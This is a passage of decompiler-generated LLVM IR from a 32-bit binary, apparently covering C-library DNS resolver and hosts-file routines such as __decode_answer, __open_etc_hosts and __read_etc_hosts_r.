  %v9_806687c = icmp eq i32 %v1_806687c, 0
  %v10_806687c = icmp slt i32 %v1_806687c, 0
  %v3_806687f = icmp eq i1 %v10_806687c, %v8_806687c
  %v4_806687f = icmp eq i1 %v9_806687c, false
  %v5_806687f = and i1 %v4_806687f, %v3_806687f
  br i1 %v5_806687f, label %dec_label_pc_8066886, label %dec_label_pc_8066881

dec_label_pc_8066881:                             ; preds = %dec_label_pc_806687a
  store i32 -1, i32* @ecx, align 4
  br label %dec_label_pc_80668a5

dec_label_pc_8066886:                             ; preds = %dec_label_pc_806687a
  %v0_8066886 = load i32, i32* @edi, align 4
  %v2_8066886 = add i32 %v0_8066886, %v8_806686c
  store i32 %v2_8066886, i32* @edx, align 4
  %v1_8066889 = add i32 %v8_806686c, 4
  store i32 %v1_8066889, i32* @ecx, align 4
  %v0_806688c = load i32, i32* @esi, align 4
  %v1_806688c = add i32 %v0_806688c, 5
  %v2_806688c = inttoptr i32 %v1_806688c to i8*
  %v3_806688c = load i8, i8* %v2_806688c, align 1
  %v3_8066890 = inttoptr i32 %v2_8066886 to i8*
  store i8 %v3_806688c, i8* %v3_8066890, align 1
  %v0_8066892 = load i32, i32* @esi, align 4
  %v1_8066892 = add i32 %v0_8066892, 4
  %v2_8066892 = inttoptr i32 %v1_8066892 to i32*
  %v3_8066892 = load i32, i32* %v2_8066892, align 4
  %v1_8066895 = trunc i32 %v3_8066892 to i8
  %v2_8066895 = load i32, i32* @edx, align 4
  %v3_8066895 = add i32 %v2_8066895, 1
  %v4_8066895 = inttoptr i32 %v3_8066895 to i8*
  store i8 %v1_8066895, i8* %v4_8066895, align 1
  %v0_8066898 = load i32, i32* @esi, align 4
  %v1_8066898 = add i32 %v0_8066898, 9
  %v2_8066898 = inttoptr i32 %v1_8066898 to i8*
  %v3_8066898 = load i8, i8* %v2_8066898, align 1
  %v2_806689c = load i32, i32* @edx, align 4
  %v3_806689c = add i32 %v2_806689c, 2
  %v4_806689c = inttoptr i32 %v3_806689c to i8*
  store i8 %v3_8066898, i8* %v4_806689c, align 1
  %v0_806689f = load i32, i32* @esi, align 4
  %v1_806689f = add i32 %v0_806689f, 8
  %v2_806689f = inttoptr i32 %v1_806689f to i32*
  %v3_806689f = load i32, i32* %v2_806689f, align 4
  %v1_80668a2 = trunc i32 %v3_806689f to i8
  %v2_80668a2 = load i32, i32* @edx, align 4
  %v3_80668a2 = add i32 %v2_80668a2, 3
  %v4_80668a2 = inttoptr i32 %v3_80668a2 to i8*
  store i8 %v1_80668a2, i8* %v4_80668a2, align 1
  %v0_80668a5.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80668a5

dec_label_pc_80668a5:                             ; preds = %entry, %dec_label_pc_8066881, %dec_label_pc_8066886
  %v0_80668a5 = phi i32 [ %v8_806686c, %entry ], [ -1, %dec_label_pc_8066881 ], [ %v0_80668a5.pre, %dec_label_pc_8066886 ]
  %v2_80668a7 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80668a7, i32* @ebx, align 4
  store i32 %v0_8066858, i32* @edi, align 4
  ret i32 %v0_80668a5

; uselistorder directives
  uselistorder i32 %v1_806687c, { 1, 0 }
  uselistorder i32 %v2_806687a, { 0, 2, 1 }
  uselistorder i32 %v8_806686c, { 1, 2, 0, 3, 5, 4 }
  uselistorder i32 -3, { 8, 4, 16, 7, 0, 1, 5, 14, 6, 15, 9, 10, 11, 12, 13, 2, 3 }
  uselistorder label %dec_label_pc_80668a5, { 2, 1, 0 }
}

define i32 @__length_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v2_80668b7 = call i32 @__length_dotted(i32 %tmp, i32 %tmp2)
  %v2_80668bf = icmp slt i32 %v2_80668b7, 0
  br i1 %v2_80668bf, label %dec_label_pc_80668c6, label %dec_label_pc_80668c3

dec_label_pc_80668c3:                             ; preds = %entry
  %v1_80668c3 = add i32 %v2_80668b7, 4
  br label %dec_label_pc_80668c6

dec_label_pc_80668c6:                             ; preds = %entry, %dec_label_pc_80668c3
  %v0_80668c9 = phi i32 [ %v2_80668b7, %entry ], [ %v1_80668c3, %dec_label_pc_80668c3 ]
  ret i32 %v0_80668c9

; uselistorder directives
  uselistorder label %dec_label_pc_80668c6, { 1, 0 }
}

define i32 @__decode_answer() local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80668cc = load i32, i32* @ebp, align 4
  %v0_80668cd = load i32, i32* @edi, align 4
  %v0_80668ce = load i32, i32* @esi, align 4
  %v0_80668cf = load i32, i32* @ebx, align 4
  store i32 %v0_80668cf, i32* %stack_var_-16, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v2_80668f0 = ptrtoint i32* %stack_var_-272 to i32
  %v4_80668fd = call i32 @__decode_dotted(i32 %tmp4, i32 %tmp7, i32 %v2_80668f0, i32 256)
  store i32 %v4_80668fd, i32* @edi, align 4
  %v3_8066907 = icmp slt i32 %v4_80668fd, 0
  br i1 %v3_8066907, label %dec_label_pc_80669b8, label %dec_label_pc_806690f

dec_label_pc_806690f:                             ; preds = %entry
  %v0_806690f = load i32, i32* @ebx, align 4
  %v3_806690f = add i32 %v0_806690f, %v4_80668fd
  %v0_8066911 = load i32, i32* @esi, align 4
  %v2_8066911 = sub i32 %v0_8066911, %v3_806690f
  %v1_8066917 = add i32 %v2_8066911, -10
  %v10_8066917 = icmp slt i32 %v1_8066917, 0
  store i32 %v1_8066917, i32* @esi, align 4
  %v1_806691e = icmp eq i1 %v10_8066917, false
  br i1 %v1_806691e, label %dec_label_pc_8066927, label %dec_label_pc_8066920

dec_label_pc_8066920:                             ; preds = %dec_label_pc_806690f
  br label %dec_label_pc_80669b8

dec_label_pc_8066927:                             ; preds = %dec_label_pc_806690f
  %v6_806692e = add i32 %v3_806690f, %tmp4
  store i32 %v6_806692e, i32* @ebx, align 4
  %v1_806693a = bitcast i32* %stack_var_-272 to i8*
  %v2_806693a = call i32 @__GI_strdup(i8* %v1_806693a)
  %v1_806693f = load i32, i32* @ebp, align 4
  %v2_806693f = inttoptr i32 %v1_806693f to i32*
  store i32 %v2_806693a, i32* %v2_806693f, align 4
  %v0_8066942 = load i32, i32* @ebx, align 4
  %v1_8066942 = add i32 %v0_8066942, 4
  store i32 %v1_8066942, i32* %esi.global-to-local, align 4
  %v1_8066945 = inttoptr i32 %v0_8066942 to i8*
  %v2_8066945 = load i8, i8* %v1_8066945, align 1
  %v3_8066945 = zext i8 %v2_8066945 to i32
  %v1_8066948 = add i32 %v0_8066942, 1
  %v2_8066948 = inttoptr i32 %v1_8066948 to i8*
  %v3_8066948 = load i8, i8* %v2_8066948, align 1
  %v4_8066948 = zext i8 %v3_8066948 to i32
  %v2_806694c = mul nuw nsw i32 %v3_8066945, 256
  %v2_806694f = or i32 %v4_8066948, %v2_806694c
  %v1_8066951 = load i32, i32* @ebp, align 4
  %v2_8066951 = add i32 %v1_8066951, 4
  %v3_8066951 = inttoptr i32 %v2_8066951 to i32*
  store i32 %v2_806694f, i32* %v3_8066951, align 4
  %v0_8066954 = load i32, i32* @ebx, align 4
  %v1_8066954 = add i32 %v0_8066954, 2
  %v2_8066954 = inttoptr i32 %v1_8066954 to i8*
  %v3_8066954 = load i8, i8* %v2_8066954, align 1
  %v4_8066954 = zext i8 %v3_8066954 to i32
  %v1_8066958 = add i32 %v0_8066954, 3
  %v2_8066958 = inttoptr i32 %v1_8066958 to i8*
  %v3_8066958 = load i8, i8* %v2_8066958, align 1
  %v4_8066958 = zext i8 %v3_8066958 to i32
  %v2_806695c = mul nuw nsw i32 %v4_8066954, 256
  %v2_806695f = or i32 %v4_8066958, %v2_806695c
  %v1_8066961 = load i32, i32* @ebp, align 4
  %v2_8066961 = add i32 %v1_8066961, 8
  %v3_8066961 = inttoptr i32 %v2_8066961 to i32*
  store i32 %v2_806695f, i32* %v3_8066961, align 4
  %v0_8066964 = load i32, i32* @ebx, align 4
  %v1_8066964 = add i32 %v0_8066964, 4
  %v2_8066964 = inttoptr i32 %v1_8066964 to i8*
  %v3_8066964 = load i8, i8* %v2_8066964, align 1
  %v4_8066964 = zext i8 %v3_8066964 to i32
  %v0_8066968 = load i32, i32* %esi.global-to-local, align 4
  %v1_8066968 = add i32 %v0_8066968, 1
  %v2_8066968 = inttoptr i32 %v1_8066968 to i8*
  %v3_8066968 = load i8, i8* %v2_8066968, align 1
  %v4_8066968 = zext i8 %v3_8066968 to i32
  %v2_806696c = mul nuw i32 %v4_8066964, 16777216
  %v2_806696f = mul nuw nsw i32 %v4_8066968, 65536
  %v1_8066972 = add i32 %v0_8066968, 2
  %v2_8066972 = inttoptr i32 %v1_8066972 to i8*
  %v3_8066972 = load i8, i8* %v2_8066972, align 1
  %v4_8066972 = zext i8 %v3_8066972 to i32
  %v2_8066976 = mul nuw nsw i32 %v4_8066972, 256
  %v2_8066979 = or i32 %v2_806696f, %v2_806696c
  %v1_806697b = add i32 %v0_8066968, 3
  %v2_806697b = inttoptr i32 %v1_806697b to i8*
  %v3_806697b = load i8, i8* %v2_806697b, align 1
  %v4_806697b = zext i8 %v3_806697b to i32
  %v2_806697f = or i32 %v4_806697b, %v2_8066979
  %v2_8066981 = or i32 %v2_806697f, %v2_8066976
  store i32 %v2_8066981, i32* @ecx, align 4
  %v1_8066983 = load i32, i32* @ebp, align 4
  %v2_8066983 = add i32 %v1_8066983, 12
  %v3_8066983 = inttoptr i32 %v2_8066983 to i32*
  store i32 %v2_8066981, i32* %v3_8066983, align 4
  %v0_8066986 = load i32, i32* @ebx, align 4
  %v1_8066986 = add i32 %v0_8066986, 8
  %v2_8066986 = inttoptr i32 %v1_8066986 to i8*
  %v3_8066986 = load i8, i8* %v2_8066986, align 1
  %v4_8066986 = zext i8 %v3_8066986 to i32
  %v1_806698a = add i32 %v0_8066986, 9
  %v2_806698a = inttoptr i32 %v1_806698a to i8*
  %v3_806698a = load i8, i8* %v2_806698a, align 1
  %v4_806698a = zext i8 %v3_806698a to i32
  %v2_806698e = mul nuw nsw i32 %v4_8066986, 256
  %v1_8066991 = add i32 %v0_8066986, 10
  %v2_8066994 = or i32 %v4_806698a, %v2_806698e
  store i32 %v2_8066994, i32* @edx, align 4
  %v1_8066996 = load i32, i32* @ebp, align 4
  %v2_8066996 = add i32 %v1_8066996, 20
  %v3_8066996 = inttoptr i32 %v2_8066996 to i32*
  store i32 %v1_8066991, i32* %v3_8066996, align 4
  %v0_8066999 = load i32, i32* @edx, align 4
  %v1_8066999 = load i32, i32* @ebp, align 4
  %v2_8066999 = add i32 %v1_8066999, 16
  %v3_8066999 = inttoptr i32 %v2_8066999 to i32*
  store i32 %v0_8066999, i32* %v3_8066999, align 4
  %v1_80669a3 = add i32 %v3_806690f, 10
  %v1_80669a6 = load i32, i32* @ebp, align 4
  %v2_80669a6 = add i32 %v1_80669a6, 24
  %v3_80669a6 = inttoptr i32 %v2_80669a6 to i32*
  store i32 %v1_80669a3, i32* %v3_80669a6, align 4
  %v4_80669a9 = load i32, i32* @edx, align 4
  %v5_80669ad = icmp slt i32 %v1_8066917, %v4_80669a9
  br i1 %v5_80669ad, label %dec_label_pc_80669af, label %dec_label_pc_80669b4

dec_label_pc_80669af:                             ; preds = %dec_label_pc_8066927
  br label %dec_label_pc_80669b8

dec_label_pc_80669b4:                             ; preds = %dec_label_pc_8066927
  %v1_80669b4 = load i32, i32* @edi, align 4
  %v2_80669b4 = add i32 %v4_80669a9, 10
  %v3_80669b4 = add i32 %v2_80669b4, %v1_80669b4
  br label %dec_label_pc_80669b8

dec_label_pc_80669b8:                             ; preds = %entry, %dec_label_pc_80669af, %dec_label_pc_8066920, %dec_label_pc_80669b4
  %v0_80669be = phi i32 [ %v4_80668fd, %entry ], [ -1, %dec_label_pc_80669af ], [ %v1_8066917, %dec_label_pc_8066920 ], [ %v3_80669b4, %dec_label_pc_80669b4 ]
  %v2_80669c0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80669c0, i32* @ebx, align 4
  store i32 %v0_80668ce, i32* @esi, align 4
  store i32 %v0_80668cd, i32* @edi, align 4
  store i32 %v0_80668cc, i32* @ebp, align 4
  ret i32 %v0_80669be

; uselistorder directives
  uselistorder i32 %v1_8066917, { 0, 1, 3, 2 }
  uselistorder i32 %v3_806690f, { 1, 0, 2 }
  uselistorder i32 %v4_80668fd, { 1, 0, 2, 3 }
  uselistorder i32 24, { 67, 68, 14, 4, 15, 0, 76, 85, 86, 1, 41, 42, 43, 44, 45, 5, 29, 75, 19, 69, 70, 71, 77, 21, 46, 74, 47, 87, 53, 3, 48, 2, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 72, 78, 79, 80, 81, 82, 83, 84, 88, 13, 73, 49, 50, 51, 52, 90, 89, 54, 20, 22, 23, 24, 25, 26, 27, 28, 16, 6, 55, 56, 57, 58, 17, 59, 7, 8, 60, 9, 10, 61, 11, 12, 62, 63, 64, 65, 18, 66 }
  uselistorder i32 16777216, { 3, 5, 4, 7, 6, 9, 8, 11, 10, 13, 12, 15, 14, 16, 19, 17, 20, 18, 22, 21, 23, 25, 24, 27, 26, 29, 28, 0, 31, 30, 1, 33, 32, 2, 35, 36, 34 }
  uselistorder i32 (i8*)* @__GI_strdup, { 4, 2, 3, 0, 1 }
  uselistorder i32 -10, { 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__decode_dotted, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_80669b8, { 3, 1, 2, 0 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %v3_80669d5 = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_806e3be.851 to i32), i32 ptrtoint (i32* @global_var_806e2f1.815 to i32))
  store i32 %v3_80669d5, i32* @eax, align 4
  %v1_80669dd = icmp eq i32 %v3_80669d5, 0
  %v1_80669df = icmp eq i1 %v1_80669dd, false
  br i1 %v1_80669df, label %dec_label_pc_80669f5, label %dec_label_pc_80669e1

dec_label_pc_80669e1:                             ; preds = %entry
  %v3_80669ed = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_806e3c9.852 to i32), i32 ptrtoint (i32* @global_var_806e2f1.815 to i32))
  br label %dec_label_pc_80669f5

dec_label_pc_80669f5:                             ; preds = %entry, %dec_label_pc_80669e1
  %v0_80669f8 = phi i32 [ %v3_80669d5, %entry ], [ %v3_80669ed, %dec_label_pc_80669e1 ]
  ret i32 %v0_80669f8

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 4, 3, 2, 1, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_806e2f1.815 to i32), { 0, 1, 2, 6, 3, 7, 4, 5 }
  uselistorder label %dec_label_pc_80669f5, { 1, 0 }
}

define i32 @__read_etc_hosts_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp59 = ptrtoint i32* %arg5 to i32
  %stack_var_-44 = alloca i8*, align 4
  %v0_80669f9 = load i32, i32* @ebp, align 4
  %v0_80669fa = load i32, i32* @edi, align 4
  %v0_80669fb = load i32, i32* @esi, align 4
  %v0_80669fc = load i32, i32* @ebx, align 4
  store i32 %arg6, i32* @ebx, align 4
  store i32 %arg7, i32* %edx.global-to-local, align 4
  %v1_8066a0a = sub i32 0, %arg6
  %v1_8066a0c = urem i32 %v1_8066a0a, 4
  %v2_8066a0c = icmp eq i32 %v1_8066a0c, 0
  store i32 %v1_8066a0c, i32* %eax.global-to-local, align 4
  br i1 %v2_8066a0c, label %dec_label_pc_8066a1d, label %dec_label_pc_8066a11

dec_label_pc_8066a11:                             ; preds = %entry
  %v2_8066a11 = sub i32 %arg7, %v1_8066a0c
  %v7_8066a11 = icmp ugt i32 %v1_8066a0c, %arg7
  br i1 %v7_8066a11, label %dec_label_pc_8066cc1, label %dec_label_pc_8066a19

dec_label_pc_8066a19:                             ; preds = %dec_label_pc_8066a11
  %v2_8066a19 = add i32 %v1_8066a0c, %arg6
  store i32 %v2_8066a19, i32* @ebx, align 4
  store i32 %v2_8066a11, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8066a1d

dec_label_pc_8066a1d:                             ; preds = %entry, %dec_label_pc_8066a19
  %v0_8066a26 = phi i32 [ %arg6, %entry ], [ %v2_8066a19, %dec_label_pc_8066a19 ]
  %v0_8066a29 = phi i32 [ %arg7, %entry ], [ %v2_8066a11, %dec_label_pc_8066a19 ]
  %tmp154 = icmp ult i32 %v0_8066a29, 32
  br i1 %tmp154, label %dec_label_pc_8066cc1, label %dec_label_pc_8066a26

dec_label_pc_8066a26:                             ; preds = %dec_label_pc_8066a1d
  %v1_8066a26 = add i32 %v0_8066a26, 32
  store i32 %v1_8066a26, i32* %eax.global-to-local, align 4
  %v1_8066a29 = add i32 %v0_8066a29, -32
  store i32 %v1_8066a29, i32* @ebp, align 4
  %v5_8066a2c = inttoptr i32 %v1_8066a26 to i8*
  %v12_8066a30 = icmp eq i32 %arg4, 1
  br i1 %v12_8066a30, label %dec_label_pc_8066b52, label %dec_label_pc_8066a3b

dec_label_pc_8066a3b:                             ; preds = %dec_label_pc_8066a26
  store i32 %arg9, i32* %eax.global-to-local, align 4
  %v1_8066a42 = inttoptr i32 %arg9 to i32*
  store i32 -1, i32* %v1_8066a42, align 4
  %tmp155 = icmp ult i32 %v1_8066a29, 4
  br i1 %tmp155, label %dec_label_pc_8066cc1, label %dec_label_pc_8066a4e

dec_label_pc_8066a4e:                             ; preds = %dec_label_pc_8066a3b
  %v0_8066a4e = load i32, i32* %edx.global-to-local, align 4
  %v1_8066a4e = add i32 %v0_8066a4e, -36
  store i32 %v1_8066a4e, i32* %eax.global-to-local, align 4
  %tmp156 = icmp ult i32 %v1_8066a4e, 8
  br i1 %tmp156, label %dec_label_pc_8066cc1, label %dec_label_pc_8066a5a

dec_label_pc_8066a5a:                             ; preds = %dec_label_pc_8066a4e
  %v0_8066a5a = load i32, i32* @ebp, align 4
  %tmp157 = icmp ult i32 %v0_8066a5a, 16
  br i1 %tmp157, label %dec_label_pc_8066cc1, label %dec_label_pc_8066a63

dec_label_pc_8066a63:                             ; preds = %dec_label_pc_8066a5a
  %v1_8066a63 = add i32 %v0_8066a4e, -48
  store i32 %v1_8066a63, i32* %eax.global-to-local, align 4
  %tmp158 = icmp ult i32 %v1_8066a63, 8
  br i1 %tmp158, label %dec_label_pc_8066cc1, label %dec_label_pc_8066a6f

dec_label_pc_8066a6f:                             ; preds = %dec_label_pc_8066a63
  %v0_8066a6f = load i32, i32* @ebx, align 4
  %v1_8066a6f = add i32 %v0_8066a6f, 48
  %v1_8066a72 = add i32 %v0_8066a4e, -44
  store i32 %v1_8066a72, i32* @ebp, align 4
  %v1_8066a79 = add i32 %v0_8066a4e, -56
  store i32 %v1_8066a79, i32* @eax, align 4
  %v1_8066a7c = add i32 %v0_8066a6f, 36
  store i32 %v1_8066a7c, i32* @edi, align 4
  %v7_8066a7f = icmp ult i32 %v1_8066a79, %v1_8066a72
  br i1 %v7_8066a7f, label %dec_label_pc_8066a88, label %dec_label_pc_8066a83

dec_label_pc_8066a83:                             ; preds = %dec_label_pc_8066a6f
  %v1_8066a83 = add i32 %v0_8066a6f, 44
  store i32 %v1_8066a83, i32* @esi, align 4
  br label %dec_label_pc_8066a8d

dec_label_pc_8066a88:                             ; preds = %dec_label_pc_8066a6f
  %v1_8066a88 = add i32 %v0_8066a6f, 56
  store i32 %v1_8066a88, i32* @esi, align 4
  store i32 %v1_8066a79, i32* @ebp, align 4
  br label %dec_label_pc_8066a8d

dec_label_pc_8066a8d:                             ; preds = %dec_label_pc_8066a83, %dec_label_pc_8066a88
  %v0_8066a8d = phi i32 [ %v1_8066a72, %dec_label_pc_8066a83 ], [ %v1_8066a79, %dec_label_pc_8066a88 ]
  %tmp159 = icmp ult i32 %v0_8066a8d, 80
  br i1 %tmp159, label %dec_label_pc_8066cc1, label %dec_label_pc_8066a96

dec_label_pc_8066a96:                             ; preds = %dec_label_pc_8066a8d
  %v0_8066a96 = call i32 @__open_etc_hosts()
  store i32 %v0_8066a96, i32* %eax.global-to-local, align 4
  %v1_8066a9f = icmp eq i32 %v0_8066a96, 0
  br i1 %v1_8066a9f, label %dec_label_pc_8066ac3, label %dec_label_pc_8066aa3

dec_label_pc_8066aa3:                             ; preds = %dec_label_pc_8066a96
  store i32 %v1_8066a26, i32* %edx.global-to-local, align 4
  store i32 %v1_8066a6f, i32* %eax.global-to-local, align 4
  store i8* %v5_8066a2c, i8** %stack_var_-44, align 4
  %v0_8066aae = load i32, i32* @edi, align 4
  %v0_8066aba = load i32, i32* @esi, align 4
  %v5_8066aba = inttoptr i32 %v0_8066aba to i8*
  br label %dec_label_pc_8066b71

dec_label_pc_8066ac3:                             ; preds = %dec_label_pc_8066a96
  store i32 %arg8, i32* %edx.global-to-local, align 4
  %v1_8066ac7 = inttoptr i32 %arg8 to i32*
  store i32 0, i32* %v1_8066ac7, align 4
  %v1_8066acd = call i32 @__errno_location(i32 0)
  store i32 %v1_8066acd, i32* %eax.global-to-local, align 4
  %v1_8066ad2 = inttoptr i32 %v1_8066acd to i32*
  %v2_8066ad2 = load i32, i32* %v1_8066ad2, align 4
  store i32 %v2_8066ad2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8066cc1

dec_label_pc_8066add:                             ; preds = %dec_label_pc_8066c44
  store i32 %stack_var_-40.0, i32* %eax.global-to-local, align 4
  %v2_8066ae1 = load i8*, i8** %stack_var_-44, align 4
  %v3_8066ae1 = ptrtoint i8* %v2_8066ae1 to i32
  %v2_8066ae4 = inttoptr i32 %stack_var_-40.0 to i32*
  store i32 %v3_8066ae1, i32* %v2_8066ae4, align 4
  %v0_8066ae6 = load i32, i32* %eax.global-to-local, align 4
  %v1_8066ae6 = add i32 %v0_8066ae6, 4
  %v2_8066ae6 = inttoptr i32 %v1_8066ae6 to i32*
  store i32 0, i32* %v2_8066ae6, align 4
  store i32 %tmp59, i32* %edx.global-to-local, align 4
  %v0_8066af1 = load i32, i32* @ebx, align 4
  %v1_8066af1 = add i32 %v0_8066af1, 4
  %v2_8066af1 = inttoptr i32 %v1_8066af1 to i32*
  %v3_8066af1 = load i32, i32* %v2_8066af1, align 4
  store i32 %v3_8066af1, i32* %eax.global-to-local, align 4
  store i32 %v3_8066af1, i32* %arg5, align 4
  %v0_8066af6 = load i32, i32* %edx.global-to-local, align 4
  %v1_8066af6 = add i32 %v0_8066af6, 8
  %v2_8066af6 = inttoptr i32 %v1_8066af6 to i32*
  store i32 2, i32* %v2_8066af6, align 4
  %v0_8066afd = load i32, i32* %edx.global-to-local, align 4
  %v1_8066afd = add i32 %v0_8066afd, 12
  %v2_8066afd = inttoptr i32 %v1_8066afd to i32*
  store i32 4, i32* %v2_8066afd, align 4
  br label %dec_label_pc_8066b36

dec_label_pc_8066b0a:                             ; preds = %dec_label_pc_8066c66
  store i32 %stack_var_-32.0, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-36.0, i32* %eax.global-to-local, align 4
  %v2_8066b12 = inttoptr i32 %stack_var_-32.0 to i32*
  store i32 %stack_var_-36.0, i32* %v2_8066b12, align 4
  %v0_8066b14 = load i32, i32* %edx.global-to-local, align 4
  %v1_8066b14 = add i32 %v0_8066b14, 4
  %v2_8066b14 = inttoptr i32 %v1_8066b14 to i32*
  store i32 0, i32* %v2_8066b14, align 4
  store i32 %tmp59, i32* %edx.global-to-local, align 4
  %v0_8066b1f = load i32, i32* @ebx, align 4
  %v1_8066b1f = add i32 %v0_8066b1f, 4
  %v2_8066b1f = inttoptr i32 %v1_8066b1f to i32*
  %v3_8066b1f = load i32, i32* %v2_8066b1f, align 4
  store i32 %v3_8066b1f, i32* %eax.global-to-local, align 4
  store i32 %v3_8066b1f, i32* %arg5, align 4
  %v0_8066b24 = load i32, i32* %edx.global-to-local, align 4
  %v1_8066b24 = add i32 %v0_8066b24, 8
  %v2_8066b24 = inttoptr i32 %v1_8066b24 to i32*
  store i32 10, i32* %v2_8066b24, align 4
  %v0_8066b2b = load i32, i32* %edx.global-to-local, align 4
  %v1_8066b2b = add i32 %v0_8066b2b, 12
  %v2_8066b2b = inttoptr i32 %v1_8066b2b to i32*
  store i32 16, i32* %v2_8066b2b, align 4
  br label %dec_label_pc_8066b36

dec_label_pc_8066b36:                             ; preds = %dec_label_pc_8066add, %dec_label_pc_8066b0a
  %storemerge = phi i32 [ %stack_var_-40.0, %dec_label_pc_8066add ], [ %stack_var_-32.0, %dec_label_pc_8066b0a ]
  %v1_8066b36 = load i32, i32* %edx.global-to-local, align 4
  %v2_8066b36 = add i32 %v1_8066b36, 16
  %v3_8066b36 = inttoptr i32 %v2_8066b36 to i32*
  store i32 %storemerge, i32* %v3_8066b36, align 4
  %v0_8066b39 = load i32, i32* @ebx, align 4
  %v1_8066b39 = add i32 %v0_8066b39, 8
  %v1_8066b3c = load i32, i32* %edx.global-to-local, align 4
  %v2_8066b3c = add i32 %v1_8066b3c, 4
  %v3_8066b3c = inttoptr i32 %v2_8066b3c to i32*
  store i32 %v1_8066b39, i32* %v3_8066b3c, align 4
  store i32 %arg8, i32* %eax.global-to-local, align 4
  %v0_8066b43 = load i32, i32* %edx.global-to-local, align 4
  %v2_8066b43 = inttoptr i32 %arg8 to i32*
  store i32 %v0_8066b43, i32* %v2_8066b43, align 4
  br label %dec_label_pc_8066ca1

dec_label_pc_8066b52:                             ; preds = %dec_label_pc_8066a26
  store i8* null, i8** %stack_var_-44, align 4
  %.pre = inttoptr i32 %arg9 to i32*
  br label %dec_label_pc_8066b71

dec_label_pc_8066b71:                             ; preds = %dec_label_pc_8066aa3, %dec_label_pc_8066b52
  %v1_8066b75.pre-phi = phi i32* [ %v1_8066a42, %dec_label_pc_8066aa3 ], [ %.pre, %dec_label_pc_8066b52 ]
  %stack_var_-32.0 = phi i32 [ %v1_8066a6f, %dec_label_pc_8066aa3 ], [ 0, %dec_label_pc_8066b52 ]
  %stack_var_-36.0 = phi i32 [ %v1_8066a26, %dec_label_pc_8066aa3 ], [ 0, %dec_label_pc_8066b52 ]
  %stack_var_-40.0 = phi i32 [ %v0_8066aae, %dec_label_pc_8066aa3 ], [ 0, %dec_label_pc_8066b52 ]
  %stack_var_4.0 = phi i32 [ %v0_8066a96, %dec_label_pc_8066aa3 ], [ %arg1, %dec_label_pc_8066b52 ]
  %stack_var_-20.0 = phi i8* [ %v5_8066aba, %dec_label_pc_8066aa3 ], [ %v5_8066a2c, %dec_label_pc_8066b52 ]
  store i32 %arg9, i32* @edx, align 4
  store i32 1, i32* %v1_8066b75.pre-phi, align 4
  %v4_8066c8d = ptrtoint i8* %stack_var_-20.0 to i32
  %v2_8066c2a = inttoptr i32 %arg2 to i8*
  %v0_8066c87125132 = load i32, i32* @edx, align 4
  %v3_8066c91126133 = call i32 @fgets(i32 %v4_8066c8d, i32 %stack_var_4.0, i32 %v0_8066c87125132)
  store i32 %v3_8066c91126133, i32* %eax.global-to-local, align 4
  %v1_8066c99127134 = icmp eq i32 %v3_8066c91126133, 0
  %v1_8066c9b128135 = icmp eq i1 %v1_8066c99127134, false
  br i1 %v1_8066c9b128135, label %dec_label_pc_8066b88.lr.ph.lr.ph, label %dec_label_pc_8066ca1

dec_label_pc_8066b88.lr.ph.lr.ph:                 ; preds = %dec_label_pc_8066b71
  %v12_8066c5f = icmp eq i32 %arg3, 10
  %v12_8066c3d = icmp eq i32 %arg3, 2
  %v12_8066c04 = icmp eq i32 %arg4, 2
  %v1_8066c09 = icmp eq i1 %v12_8066c04, false
  %v1_8066c42 = icmp eq i1 %v12_8066c3d, false
  %v1_8066c64 = icmp eq i1 %v12_8066c5f, false
  br label %dec_label_pc_8066b88.lr.ph

dec_label_pc_8066b88.lr.ph:                       ; preds = %dec_label_pc_8066b88.lr.ph.lr.ph, %dec_label_pc_8066c87.outer.backedge
  %stack_var_-28.0.ph136 = phi i32 [ 1, %dec_label_pc_8066b88.lr.ph.lr.ph ], [ 2, %dec_label_pc_8066c87.outer.backedge ]
  br label %dec_label_pc_8066b88

dec_label_pc_8066b88:                             ; preds = %dec_label_pc_8066b88.lr.ph, %dec_label_pc_8066c87.backedge
  %v3_8066b90 = call i32 @__GI_strchr(i8* %stack_var_-20.0, i32 35)
  store i32 %v3_8066b90, i32* @eax, align 4
  %v1_8066b98 = icmp eq i32 %v3_8066b90, 0
  br i1 %v1_8066b98, label %dec_label_pc_8066b9f, label %dec_label_pc_8066b9c

dec_label_pc_8066b9c:                             ; preds = %dec_label_pc_8066b88
  %v1_8066b9c = inttoptr i32 %v3_8066b90 to i8*
  store i8 0, i8* %v1_8066b9c, align 1
  br label %dec_label_pc_8066b9f

dec_label_pc_8066b9f:                             ; preds = %dec_label_pc_8066b88, %dec_label_pc_8066b9c
  store i32 %v4_8066c8d, i32* @ecx, align 4
  store i32 0, i32* @edi, align 4
  %v2_8066bdf32 = load i8, i8* %stack_var_-20.0, align 1
  %v3_8066bdf33 = icmp eq i8 %v2_8066bdf32, 0
  %v1_8066be239 = icmp eq i1 %v3_8066bdf33, false
  br i1 %v1_8066be239, label %dec_label_pc_8066bab.preheader.preheader, label %dec_label_pc_8066be4

dec_label_pc_8066bab.preheader.preheader:         ; preds = %dec_label_pc_8066b9f
